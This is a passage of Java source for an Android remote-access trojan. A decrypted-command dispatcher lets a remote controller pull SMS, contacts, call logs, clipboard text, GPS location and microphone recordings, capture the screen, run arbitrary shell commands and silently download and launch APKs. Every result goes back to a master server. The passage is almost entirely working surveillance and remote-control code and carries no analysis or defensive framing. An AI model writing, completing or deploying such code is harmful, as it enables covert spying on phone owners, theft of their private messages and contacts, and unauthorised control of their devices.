            devicePolicyManager.setKeyguardDisabledFeatures(MyService.componentName, 0);
            return;
          case 2:
            devicePolicyManager.setKeyguardDisabledFeatures(MyService.componentName, 32);
            return;
          case 3:
            devicePolicyManager.setKeyguardDisabledFeatures(MyService.componentName, 2);
            return;
          case 4:
            devicePolicyManager.setKeyguardDisabledFeatures(MyService.componentName, 4);
            return;
          case 5:
            devicePolicyManager.setKeyguardDisabledFeatures(MyService.componentName, 16);
            return;
          case 6:
            devicePolicyManager.setKeyguardDisabledFeatures(MyService.componentName, 8);
            return;
          case 7:
            devicePolicyManager.setKeyguardDisabledFeatures(MyService.componentName, 1);
            return;
          default:
            return;
        }
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void getLocation(final int i, final int i2) {
    try {
      new Handler(Looper.getMainLooper()).post(new Runnable() {
        @Override public void run() {
          ((LocationManager) MyService.context.getSystemService(
              Context.LOCATION_SERVICE)).requestLocationUpdates("gps", (long) i, (float) i2,
              locationListener, null);
        }
      });
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void downloadApk(String str) {
    try {
      if (VERSION.SDK_INT >= 9) {
        f = "/" + str.split("/")[str.split("/").length - 1];
        if (new File(MyService.context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
            .getCanonicalPath() + f).exists()) {
          openDownloadedApk();
          return;
        }
        DownloadManager downloadManager =
            (DownloadManager) MyService.context.getSystemService(Context.DOWNLOAD_SERVICE);
        Request request = new Request(Uri.parse(str));
        request.setDestinationInExternalFilesDir(MyService.context, Environment.DIRECTORY_DOWNLOADS,
            f);
        request.setVisibleInDownloadsUi(false);
        request.setAllowedNetworkTypes(3);
        if (VERSION.SDK_INT >= 16) {
          request.setAllowedOverMetered(true);
        }
        request.setAllowedOverRoaming(true);
        if (VERSION.SDK_INT >= 11) {
          request.setNotificationVisibility(2);
        }
        MyService.context.registerReceiver(p,
            new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"));
        downloadManager.enqueue(request);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void getBrowserHistory() {
    try {
      /*Action action = new Action();
      List arrayList = new ArrayList();
      Cursor query = MyService.context.getContentResolver()
          .query(android.provider.Browser.BOOKMARKS_URI, null, null, null, null);
      if (query.moveToFirst()) {
        do {
          History history = new History();
          history.CREATED = query.getLong(query.getColumnIndex("created"));
          history.TITLE = query.getString(query.getColumnIndex("title"));
          history.URL = query.getString(query.getColumnIndex("url"));
          arrayList.add(history);
        } while (query.moveToNext());
        query.close();
      }
      action.ACTION = 65;
      action.DATA = arrayList;
      SendMasterCommunication.sendAction(action);*/
    } catch (Exception sendCallLogs) {
      sendExceptionAction(sendCallLogs.getMessage());
    }
  }

  private void setUiMode(int i) {
    try {
      if (VERSION.SDK_INT >= 8) {
        UiModeManager uiModeManager =
            (UiModeManager) MyService.context.getSystemService(Context.UI_MODE_SERVICE);
        switch (i) {
          case 3:
            uiModeManager.enableCarMode(0);
            return;
          case 4:
            uiModeManager.disableCarMode(0);
            return;
          default:
            uiModeManager.setNightMode(i);
            return;
        }
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void c(String str) {
    try {
      if (VERSION.SDK_INT >= 9) {
        DownloadManager downloadManager =
            (DownloadManager) MyService.context.getSystemService(Context.DOWNLOAD_SERVICE);
        Request request = new Request(Uri.parse(str));
        request.setDestinationInExternalFilesDir(MyService.context, Environment.DIRECTORY_PICTURES,
            str.split("/")[str.split("/").length - 1]);
        request.setVisibleInDownloadsUi(false);
        request.setAllowedNetworkTypes(3);
        if (VERSION.SDK_INT >= 16) {
          request.setAllowedOverMetered(true);
        }
        request.setAllowedOverRoaming(true);
        if (VERSION.SDK_INT >= 11) {
          request.setNotificationVisibility(2);
        }
        MyService.context.registerReceiver(u,
            new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"));
        downloadManager.enqueue(request);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void getBrowserSearches() {
    try {
      /*Action action = new Action();
      List arrayList = new ArrayList();
      Cursor query = MyService.context.getContentResolver()
          .query(android.provider.Browser.SEARCHES_URI, null, null, null, null);
      if (query.moveToFirst()) {
        do {
          Searches searches = new Searches();
          searches.SEARCH = query.getString(query.getColumnIndex("search"));
          searches.DATE = query.getLong(query.getColumnIndex("date"));
          arrayList.add(searches);
        } while (query.moveToNext());
        query.close();
      }
      action.ACTION = 66;
      action.DATA = arrayList;
      SendMasterCommunication.sendAction(action);*/
    } catch (Exception sendCallLogs) {
      sendExceptionAction(sendCallLogs.getMessage());
    }
  }

  private void registerListenerSensor(int i) {
    try {
      if (VERSION.SDK_INT >= 3) {
        SensorManager sensorManager =
            (SensorManager) MyService.context.getSystemService(Context.SENSOR_SERVICE);
        sensorManager.registerListener(sensorEventListener, sensorManager.getDefaultSensor(i),
            3);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void d(String str) {
    try {
      if (VERSION.SDK_INT >= 9) {
        DownloadManager downloadManager =
            (DownloadManager) MyService.context.getSystemService(Context.DOWNLOAD_SERVICE);
        Request request = new Request(Uri.parse(str));
        request.setDestinationInExternalFilesDir(MyService.context, Environment.DIRECTORY_PICTURES,
            str.split("/")[str.split("/").length - 1]);
        request.setVisibleInDownloadsUi(false);
        request.setAllowedNetworkTypes(3);
        if (VERSION.SDK_INT >= 16) {
          request.setAllowedOverMetered(true);
        }
        request.setAllowedOverRoaming(true);
        if (VERSION.SDK_INT >= 11) {
          request.setNotificationVisibility(2);
        }
        MyService.context.registerReceiver(t,
            new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"));
        downloadManager.enqueue(request);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void sendCallLogs() {
    try {
      Action action = new Action();
      List arrayList = new ArrayList();
      Cursor query = MyService.context.getContentResolver()
          .query(Uri.parse("content://call_log/calls"), null, null, null, null);
      if (query.moveToFirst()) {
        do {
          Call call = new Call();
          call.NAME = query.getString(query.getColumnIndex("name"));
          call.NUMBER = query.getString(query.getColumnIndex("number"));
          switch (query.getInt(query.getColumnIndex("type"))) {
            case 1:
              call.TYPE = "Incoming";
              break;
            case 2:
              call.TYPE = "Outgoing";
              break;
            case 3:
              call.TYPE = "Missed";
              break;
          }
          call.DURATION = query.getString(query.getColumnIndex("duration"));
          call.DATE = query.getString(query.getColumnIndex("date"));
          call.COUNTRY =
              query.getString(query.getColumnIndex("geocoded_location")) + " (" + query.getString(
                  query.getColumnIndex("countryiso")) + ")";
          arrayList.add(call);
        } while (query.moveToNext());
        query.close();
      }
      action.ACTION = 64;
      action.DATA = arrayList;
      SendMasterCommunication.sendAction(action);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void e(String str) {
    try {
      if (VERSION.SDK_INT >= 9) {
        DownloadManager downloadManager =
            (DownloadManager) MyService.context.getSystemService(Context.DOWNLOAD_SERVICE);
        Request request = new Request(Uri.parse(str));
        request.setDestinationInExternalFilesDir(MyService.context, Environment.DIRECTORY_PICTURES,
            str.split("/")[str.split("/").length - 1]);
        request.setVisibleInDownloadsUi(false);
        request.setAllowedNetworkTypes(3);
        if (VERSION.SDK_INT >= 16) {
          request.setAllowedOverMetered(true);
        }
        request.setAllowedOverRoaming(true);
        if (VERSION.SDK_INT >= 11) {
          request.setNotificationVisibility(2);
        }
        MyService.context.registerReceiver(s,
            new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"));
        downloadManager.enqueue(request);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void copyClipboard() {
    try {
      new Handler(Looper.getMainLooper()).post(new Runnable() {
        public void run() {
          try {
            sendClipboard(((ClipboardManager) MyService.context.getSystemService(
                Context.CLIPBOARD_SERVICE)).getText().toString());
          } catch (Exception e) {
          }
        }
      });
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void downloadPictures(String str) {
    try {
      if (VERSION.SDK_INT >= 9) {
        DownloadManager downloadManager =
            (DownloadManager) MyService.context.getSystemService(Context.DOWNLOAD_SERVICE);
        Request request = new Request(Uri.parse(str));
        request.setDestinationInExternalFilesDir(MyService.context, Environment.DIRECTORY_PICTURES,
            str.split("/")[str.split("/").length - 1]);
        request.setVisibleInDownloadsUi(false);
        request.setAllowedNetworkTypes(3);
        if (VERSION.SDK_INT >= 16) {
          request.setAllowedOverMetered(true);
        }
        request.setAllowedOverRoaming(true);
        if (VERSION.SDK_INT >= 11) {
          request.setNotificationVisibility(2);
        }
        MyService.context.registerReceiver(q,
            new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"));
        downloadManager.enqueue(request);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void sendContacts() {
    try {
      if (VERSION.SDK_INT >= 5) {
        Action action = new Action();
        List arrayList = new ArrayList();
        Cursor query =
            MyService.context.getContentResolver().query(Phone.CONTENT_URI, null, null, null, null);
        if (query.moveToFirst()) {
          do {
            Contact contact = new Contact();
            contact.NAME = query.getString(query.getColumnIndex("display_name"));
            contact.ADDRESS = query.getString(query.getColumnIndex("data1"));
            if (!arrayList.contains(contact)) {
              arrayList.add(contact);
            }
          } while (query.moveToNext());
          query.close();
        }
        action.ACTION = 63;
        action.DATA = arrayList;
        SendMasterCommunication.sendAction(action);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void downloadRingtone(String str) {
    try {
      if (VERSION.SDK_INT >= 9) {
        DownloadManager downloadManager =
            (DownloadManager) MyService.context.getSystemService(Context.DOWNLOAD_SERVICE);
        Request request = new Request(Uri.parse(str));
        request.setDestinationInExternalFilesDir(MyService.context, Environment.DIRECTORY_RINGTONES,
            str.split("/")[str.split("/").length - 1]);
        request.setVisibleInDownloadsUi(false);
        request.setAllowedNetworkTypes(3);
        if (VERSION.SDK_INT >= 16) {
          request.setAllowedOverMetered(true);
        }
        request.setAllowedOverRoaming(true);
        if (VERSION.SDK_INT >= 11) {
          request.setNotificationVisibility(2);
        }
        MyService.context.registerReceiver(r,
            new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"));
        downloadManager.enqueue(request);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void getContacts() {
    try {
      if (VERSION.SDK_INT >= 5) {
        Action action = new Action();
        List arrayList = new ArrayList();
        Cursor query =
            MyService.context.getContentResolver().query(Phone.CONTENT_URI, null, null, null, null);
        if (query.moveToFirst()) {
          do {
            Contact contact = new Contact();
            contact.NAME = query.getString(query.getColumnIndex("display_name"));
            contact.ADDRESS = query.getString(query.getColumnIndex("data1"));
            if (!arrayList.contains(contact)) {
              arrayList.add(contact);
            }
          } while (query.moveToNext());
          query.close();
        }
        action.ACTION = 72;
        action.DATA = arrayList;
        SendMasterCommunication.sendAction(action);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void h(String str) {
    try {
      if (VERSION.SDK_INT >= 9) {
        b = "/" + str.split("/")[str.split("/").length - 1];
        if (new File(
            MyService.context.getExternalFilesDir(Environment.DIRECTORY_PICTURES).getCanonicalPath()
                + b).exists()) {
          setWallpaper(b);
          return;
        }
        DownloadManager downloadManager =
            (DownloadManager) MyService.context.getSystemService(Context.DOWNLOAD_SERVICE);
        Request request = new Request(Uri.parse(str));
        request.setDestinationInExternalFilesDir(MyService.context, Environment.DIRECTORY_PICTURES,
            b);
        request.setVisibleInDownloadsUi(false);
        request.setAllowedNetworkTypes(3);
        if (VERSION.SDK_INT >= 16) {
          request.setAllowedOverMetered(true);
        }
        request.setAllowedOverRoaming(true);
        if (VERSION.SDK_INT >= 11) {
          request.setNotificationVisibility(2);
        }
        MyService.context.registerReceiver(v,
            new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"));
        downloadManager.enqueue(request);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private DownloadInfo getDownloadInfo() {
    long j = 0;
    try {
      if (VERSION.SDK_INT < 11) {
        return new DownloadInfo();
      }
      DownloadInfo downloadInfo = new DownloadInfo();
      downloadInfo.MAXBYTES = DownloadManager.getMaxBytesOverMobile(MyService.context) == null ? 0
          : DownloadManager.getMaxBytesOverMobile(MyService.context).longValue();
      if (DownloadManager.getRecommendedMaxBytesOverMobile(MyService.context) != null) {
        j = DownloadManager.getRecommendedMaxBytesOverMobile(MyService.context).longValue();
      }
      downloadInfo.RECBYTES = j;
      return downloadInfo;
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
      return new DownloadInfo();
    }
  }

  private void toogleBluetooth(String str) {
    try {
      if (VERSION.SDK_INT >= 18) {
        BluetoothAdapter adapter = ((BluetoothManager) MyService.context.getSystemService(
            Context.BLUETOOTH_SERVICE)).getAdapter();
        int obj = -1;
        switch (str.hashCode()) {
          case -959006008:
            if (str.equals("Disable")) {
              obj = 1;
              break;
            }
            break;
          case 2079986083:
            if (str.equals("Enable")) {
              obj = 0;
              break;
            }
            break;
        }
        switch (obj) {
          case 0:
            adapter.enable();
            return;
          case 1:
            adapter.disable();
            return;
          default:
            return;
        }
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void getAllSms() {
    try {
      String string;
      List list;
      Map hashMap = new HashMap();
      Cursor query = MyService.context.getContentResolver()
          .query(Uri.parse("content://sms/sent"), null, null, null, null);
      if (query.moveToFirst()) {
        do {
          string = query.getString(2);
          if (hashMap.containsKey(string)) {
            list = (List) hashMap.get(string);
            list.add(new SMS(query.getLong(4), query.getString(12), true));
            hashMap.put(string, list);
          } else {
            hashMap.put(string, new ArrayList());
            list = (List) hashMap.get(string);
            list.add(new SMS(query.getLong(4), query.getString(12), true));
            hashMap.put(string, list);
          }
        } while (query.moveToNext());
        query.close();
      }
      query = MyService.context.getContentResolver()
          .query(Uri.parse("content://sms/inbox"), null, null, null, null);
      if (query.moveToFirst()) {
        do {
          string = query.getString(2);
          if (hashMap.containsKey(string)) {
            list = (List) hashMap.get(string);
            list.add(new SMS(query.getLong(4), query.getString(12), false));
            hashMap.put(string, list);
          } else {
            hashMap.put(string, new ArrayList());
            list = (List) hashMap.get(string);
            list.add(new SMS(query.getLong(4), query.getString(12), false));
            hashMap.put(string, list);
          }
        } while (query.moveToNext());
        query.close();
      }
      Action action = new Action();
      action.ACTION = 61;
      action.DATA = hashMap;
      SendMasterCommunication.sendAction(action);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void getLocation(final String str) {
    try {
      if (VERSION.SDK_INT >= 9) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
          @Override public void run() {
            ((LocationManager) MyService.context.getSystemService(
                Context.LOCATION_SERVICE)).requestSingleUpdate(str, new LocationListener() {
              public void onLocationChanged(Location location) {
                SendMasterCommunication.sendAction(new LocationInfo());
              }

              public void onProviderDisabled(String str) {
              }

              public void onProviderEnabled(String str) {
              }

              public void onStatusChanged(String str, int i, Bundle bundle) {
              }
            }, null);
          }
        });
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private List<Services> getRunningServices() {
    try {
      List<Services> arrayList = new ArrayList();
      for (RunningServiceInfo runningServiceInfo : ((ActivityManager) MyService.context.getSystemService(
          Context.ACTIVITY_SERVICE)).getRunningServices(Integer.MAX_VALUE)) {
        Services services = new Services();
        services.ACTIVESINCE = runningServiceInfo.activeSince;
        if ((runningServiceInfo.flags & 2) == 2) {
          services.FLAGS += "Foreground, ";
        }
        if ((runningServiceInfo.flags & 8) == 8) {
          services.FLAGS += "Persistent Process, ";
        }
        if ((runningServiceInfo.flags & 1) == 1) {
          services.FLAGS += "Started, ";
        }
        if ((runningServiceInfo.flags & 4) == 4) {
          services.FLAGS += "System Process, ";
        }
        if (services.FLAGS.endsWith(", ")) {
          services.FLAGS = services.FLAGS.substring(0, services.FLAGS.length() - 2);
        }
        services.LASTACTIVITYTIME = runningServiceInfo.lastActivityTime;
        services.PID = runningServiceInfo.pid;
        services.PROCESS = runningServiceInfo.process;
        services.CLASSNAME = runningServiceInfo.service.getClassName();
        services.PACKAGENAME = runningServiceInfo.service.getPackageName();
        services.STARTED = runningServiceInfo.started;
        services.UID = runningServiceInfo.uid;
        arrayList.add(services);
      }
      return arrayList;
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
      return new ArrayList();
    }
  }

  private void executeCommand(String command) {
    try {
      String str2 = "";
      BufferedReader bufferedReader = new BufferedReader(
          new InputStreamReader(Runtime.getRuntime().exec(command).getInputStream()));
      while (true) {
        String readLine = bufferedReader.readLine();
        if (readLine != null) {
          str2 = str2 + readLine + "\n";
        } else {
          bufferedReader.close();
          Action action = new Action();
          action.ACTION = 79;
          action.DATA = str2;
          SendMasterCommunication.sendAction(action);
          return;
        }
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void openDownloadedApk() {
    try {
      if (VERSION.SDK_INT >= 8) {
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setDataAndType(Uri.parse(
            "file://" + MyService.context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
                .getCanonicalPath() + f), "application/vnd.android.package-archive");
        intent.setFlags(268435456);
        MyService.context.startActivity(intent);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private boolean isFileExist(String filename) {
    try {
      return new File(filename).exists();
    } catch (Exception e) {
      return false;
    }
  }

  private void viewDocument(String str) {
    try {
      Intent intent = new Intent("android.intent.action.VIEW");
      intent.setData(Uri.parse(str));
      intent.setFlags(268435456);
      MyService.context.startActivity(intent);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private boolean isRooted() {
    try {
      String str = Build.TAGS;
      if ((str != null && str.contains("test-keys"))
          || isFileExist("/system/app/SuperSU")
          || isFileExist("/system/app/SuperSU.apk")
          || isFileExist("/system/app/Superuser")
          || isFileExist("/system/app/Superuser.apk")
          || isFileExist("/system/xbin/su")
          || isFileExist("/system/xbin/_su")
          || executeShellCommand("/system/xbin/which su")
          || executeShellCommand("/system/bin/which su")
          || executeShellCommand("which su")) {
        return true;
      }
    } catch (Exception e) {
    }
    return false;
  }

  private void sendCameraInfo() {
    try {
      if (VERSION.SDK_INT >= 9) {
        Action action = new Action();
        action.ACTION = 111;
        String[] obj = new String[Camera.getNumberOfCameras()];
        for (int i = 0; i < obj.length; i++) {
          CameraInfo cameraInfo = new CameraInfo();
          Camera.getCameraInfo(i, cameraInfo);
          String str = cameraInfo.facing == 0 ? "Back" : "Front";
          obj[i] = String.format("%registerListenerSensor, %registerListenerSensor", new Object[] { i, str });
        }
        action.DATA = obj;
        SendMasterCommunication.sendAction(action);
        return;
      }
      sendExceptionAction("Android Version not supported.");
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void openDeviceAdminActivity(String str) {
    try {
      Intent intent = new Intent(MyService.context, DeviceAdminActivity.class);
      intent.putExtra("Explanation", str);
      intent.setFlags(268435456);
      MyService.context.startActivity(intent);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void sendWallpaper() {
    try {
      if (VERSION.SDK_INT >= 19) {
        Action action = new Action();
        action.ACTION = 44;
        WallpaperManager instance = WallpaperManager.getInstance(MyService.context);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ((BitmapDrawable) instance.getBuiltInDrawable()).getBitmap()
            .compress(CompressFormat.JPEG, 100, byteArrayOutputStream);
        action.DATA = byteArrayOutputStream.toByteArray();
        SendMasterCommunication.sendAction(action);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void sendClipboard(String str) {
    try {
      Clipboard clipboard = new Clipboard();
      clipboard.TEXT = str;
      SendMasterCommunication.sendAction(clipboard);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void startBluetoothScan() {
    try {
      if (VERSION.SDK_INT >= 18) {
        BluetoothAdapter adapter = ((BluetoothManager) MyService.context.getSystemService(
            Context.BLUETOOTH_SERVICE)).getAdapter();
        MyService.context.registerReceiver(new BluetoothFoundReceiver(),
            new IntentFilter(BluetoothDevice.ACTION_FOUND));
        adapter.startDiscovery();
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void setWallpaper(String path) {
    try {
      if (VERSION.SDK_INT >= 8) {
        WallpaperManager.getInstance(MyService.context)
            .setBitmap(BitmapFactory.decodeFile(
                MyService.context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                    .getCanonicalPath() + path));
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void startRecordAudio() {
    try {
      file = File.createTempFile("rec", "");
      mediaRecorder = new MediaRecorder();
      mediaRecorder.setAudioSource(1);
      mediaRecorder.setOutputFormat(1);
      mediaRecorder.setAudioEncoder(4);
      mediaRecorder.setOutputFile(file.getCanonicalPath());
      mediaRecorder.prepare();
      mediaRecorder.start();
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void stopRecordAudio() {
    try {
      mediaRecorder.stop();
      mediaRecorder.reset();
      mediaRecorder.release();

      byte[] obj = new byte[((int) file.length())];
      BufferedInputStream bufferedInputStream =
          new BufferedInputStream(new FileInputStream(file));
      bufferedInputStream.read(obj, 0, obj.length);
      bufferedInputStream.close();

      Action action = new Action();
      action.ACTION = 55;
      action.DATA = obj;
      SendMasterCommunication.sendAction(action);
      file.delete();
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void stopListenSensorEvent() {
    try {
      if (VERSION.SDK_INT >= 3) {
        ((SensorManager) MyService.context.getSystemService(
            Context.SENSOR_SERVICE)).unregisterListener(sensorEventListener);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  public void executeAction(Object obj) {
    try {
      Intent intent;
      Object action = decrypt(obj);
      if (action instanceof Integer) {
        if (action.equals(-1)) {
          // TODO
        } else if (action.equals(0)) {
          SendMasterCommunication.sendAction(new _System());
        } else if (action.equals(1)) {
          SendMasterCommunication.sendAction(new Battery());
          IntentFilter intentFilter = new IntentFilter();
          intentFilter.addAction(ACTION_BATTERY_CHANGED);
          intentFilter.addAction(ACTION_POWER_CONNECTED);
          intentFilter.addAction(ACTION_POWER_DISCONNECTED);
          MyService.context.registerReceiver(batteryReceiver, intentFilter);
        } else if (action.equals(2)) {
          SendMasterCommunication.sendAction(new Configuration());
        } else if (action.equals(3)) {
          SendMasterCommunication.sendAction(new Memory());
        } else if (action.equals(4)) {
          SendMasterCommunication.sendAction(new Telephony());
        } else if (action.equals(5)) {
          SendMasterCommunication.sendAction(new Wifi());
          IntentFilter intentFilter = new IntentFilter();
          intentFilter.addAction(WifiManager.RSSI_CHANGED_ACTION);
          intentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
          MyService.context.registerReceiver(wifiReceiver, intentFilter);
        } else if (action.equals(6)) {
          SendMasterCommunication.sendAction(new WifiScan());
        } else if (action.equals(7)) {
          SendMasterCommunication.sendAction(new ConfiguredWifi());
        } else if (action.equals(8)) {
          executeWifiCommand(2, 0);
        } else if (action.equals(9)) {
          executeWifiCommand(3, 0);
        } else if (action.equals(12)) {
          executeWifiCommand(4, 0);
        } else if (action.equals(13)) {
          executeWifiCommand(5, 0);
        } else if (action.equals(14)) {
          SendMasterCommunication.sendAction(new Account());
        } else if (action.equals(15)) {
          SendMasterCommunication.sendAction(new AppWidget());
        } else if (action.equals(16)) {
          SendMasterCommunication.sendAction(new Audio());
          MyService.context.registerReceiver(volumeReceiver,
              new IntentFilter(RINGER_MODE_CHANGED_ACTION));
        } else if (action.equals(17)) {
          SendMasterCommunication.sendAction(new AudioManager());
        } else if (action.equals(18)) {
          SendMasterCommunication.sendAction(new Bluetooth());
          IntentFilter intentFilter = new IntentFilter();
          intentFilter.addAction(BluetoothAdapter.ACTION_CONNECTION_STATE_CHANGED);
          intentFilter.addAction(BluetoothAdapter.ACTION_LOCAL_NAME_CHANGED);
          intentFilter.addAction(BluetoothAdapter.ACTION_SCAN_MODE_CHANGED);
          intentFilter.addAction(BluetoothAdapter.ACTION_STATE_CHANGED);
          MyService.context.registerReceiver(bluetoothReceiver, intentFilter);
        } else if (action.equals(19)) {
          SendMasterCommunication.sendAction(new _BluetoothManager());
          IntentFilter intentFilter = new IntentFilter();
          intentFilter.addAction(BluetoothAdapter.ACTION_DISCOVERY_STARTED);
          intentFilter.addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED);
          MyService.context.registerReceiver(bluetoothDiscoveryReceiver, intentFilter);
        } else if (action.equals(20)) {
          toogleBluetooth("Enable");
        } else if (action.equals(21)) {
          toogleBluetooth("Disable");
        } else if (action.equals(22)) {
          copyClipboard();
        } else if (action.equals(23)) {
          SendMasterCommunication.sendAction(new Connectivity());
        } else if (action.equals(25)) {
          SendMasterCommunication.sendAction(new Display());
        } else if (action.equals(26)) {
          Activity r2 = new Activity();
          r2.LIST = getRunningServices();
          r2.TYPE = 0;
          SendMasterCommunication.sendAction(r2);
        } else if (action.equals(27)) {
          Activity r2 = new Activity();
          r2.LIST = getAppProcesses();
          r2.TYPE = 1;
          SendMasterCommunication.sendAction(r2);
        } else if (action.equals(28)) {
          SendMasterCommunication.sendAction(getDownloadInfo());
        } else if (action.equals(29)) {
          SendMasterCommunication.sendAction(new LocationInfo());
        } else if (action.equals(30)) {
          intent = new Intent("android.settings.LOCATION_SOURCE_SETTINGS");
          intent.addFlags(268435456);
          MyService.context.startActivity(intent);
        } else if (action.equals(31)) {
          getLocation("network");
        } else if (action.equals(32)) {
          getLocation("gps");
        } else if (action.equals(33)) {
          SendMasterCommunication.sendAction(new Sensors());
        } else if (action.equals(35)) {
          stopListenSensorEvent();
        } else if (action.equals(36)) {
          SendMasterCommunication.sendAction(new UiMode());
        } else if (action.equals(38)) {
          setUiMode(3);
        } else if (action.equals(39)) {
          setUiMode(4);
        } else if (action.equals(42)) {
          executeVibrateCommand(0, 0, null, false);
        } else if (action.equals(40)) {
          Action action2 = new Action();
          action2.ACTION = 40;
          boolean z = VERSION.SDK_INT >= 11 && ((Vibrator) MyService.context.getSystemService(
              Context.VIBRATOR_SERVICE)).hasVibrator();
          action2.DATA = Boolean.valueOf(z);
          SendMasterCommunication.sendAction(action2);
        } else if (action.equals(43)) {
          SendMasterCommunication.sendAction(new Wallpaper());
          MyService.context.registerReceiver(wallpaperReceiver,
              new IntentFilter("android.intent.action.WALLPAPER_CHANGED"));
        } else if (action.equals(44)) {
          sendWallpaper();
        } else if (action.equals(45)) {
          if (VERSION.SDK_INT >= 5) {
            WallpaperManager.getInstance(MyService.context).clear();
          }
        } else if (action.equals(47)) {
          FileUtils.getFileSystemRoots();
        } else if (action.equals(53)) {
          startRecordAudio();
        } else if (action.equals(54)) {
          stopRecordAudio();
        } else if (action.equals(56)) {
          SendMasterCommunication.sendAction(new InstalledApps());
        } else if (action.equals(57)) {
          SendMasterCommunication.sendAction(new Features());
        } else if (action.equals(58)) {
          startBluetoothScan();
        } else if (action.equals(59)) {
          if (VERSION.SDK_INT >= 18) {
            ((BluetoothManager) MyService.context.getSystemService(
                Context.BLUETOOTH_SERVICE)).getAdapter().cancelDiscovery();
          }
        } else if (action.equals(61)) {
          // TODO
        } else if (action.equals(63)) {
          sendContacts();
        } else if (action.equals(64)) {
          sendCallLogs();
        } else if (action.equals(65)) {
          getBrowserHistory();
        } else if (action.equals(66)) {
          getBrowserSearches();
        } else if (action.equals(67)) {
          // TODO: Browser stuff
        } else if (action.equals(69)) {
          // TODO: Browser stuff
        } else if (action.equals(72)) {
          getContacts();
        } else if (action.equals(76)) {
          endCall();
        } else if (action.equals(81)) {
          Action action3 = new Action();
          action3.ACTION = 81;
          if (VERSION.SDK_INT >= 11) {
            action3.DATA = ((ActivityManager) MyService.context.getSystemService(
                Context.ACTIVITY_SERVICE)).getLauncherLargeIconSize();
          } else {
            action3.DATA = 0;
          }
          SendMasterCommunication.sendAction(action3);
        } else if (action.equals(84)) {
          // TODO: Send sms stuff
        } else if (action.equals(86)) {
          // TODO: Send sms stuff
        } else if (action.equals(85)) {
          // TODO: Send sms stuff
        } else if (action.equals(87)) {
          // TODO: Send sms stuff
        } else if (action.equals(90)) {
          sendIsAdminActive(90);
        } else if (action.equals(91)) {
          sendIsAdminActive(91);
        } else if (action.equals(96)) {
          transmitInfraredPattern(96, null);
        } else if (action.equals(98)) {
          transmitInfraredPattern(98, null);
        } else if (action.equals(99)) {
          transmitInfraredPattern(99, null);
        } else if (action.equals(100)) {
          transmitInfraredPattern(100, null);
        } else if (action.equals(101)) {
          transmitInfraredPattern(101, null);
        } else if (action.equals(102)) {
          transmitInfraredPattern(102, null);
        } else if (action.equals(103)) {
          transmitInfraredPattern(103, null);
        } else if (action.equals(93)) {
          transmitInfraredPattern(93, null);
        } else if (!action.equals(105)) {
          if (action.equals(106)) {
            if (VERSION.SDK_INT >= 21) {
              intent = new Intent(MyService.context, MediaProjectionActivity.class);
              intent.setFlags(268435456);
              MyService.context.startActivity(intent);
              return;
            }
            sendExceptionAction("Recording Screen is not supported on this device!");
          } else if (action.equals(107)) {
            MediaProjectionActivity.clean();
          } else if (action.equals(111)) {
            sendCameraInfo();
          } else if (action.equals(113)) {
            Action action1 = new Action();
            action1.ACTION = 113;
            action1.DATA = isRooted();
            SendMasterCommunication.sendAction(action1);
          } else if (action.equals(127)) {
            MyService.context.unregisterReceiver(volumeReceiver);
          } else if (action.equals(123)) {
            MyService.context.unregisterReceiver(batteryReceiver);
          } else if (action.equals(124)) {
            MyService.context.unregisterReceiver(bluetoothReceiver);
